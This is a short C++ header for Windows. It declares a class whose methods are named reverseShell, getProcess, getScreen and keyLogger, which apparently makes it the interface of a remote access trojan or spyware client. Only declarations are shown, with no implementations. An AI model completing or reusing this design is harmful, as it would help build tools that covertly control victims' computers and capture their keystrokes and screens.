#pragma once
#include <string>
#include <Windows.h>

class commandManager
{
private:
	ULONG64 data_len = 0;

public:
	commandManager();
	std::string reverseShell(std::string cmd);
	void getProcess();
	bool getScreen(LPCSTR fname);
	ULONG64 getDataLen() {
		return this->data_len;
	}
	void keyLogger();
};

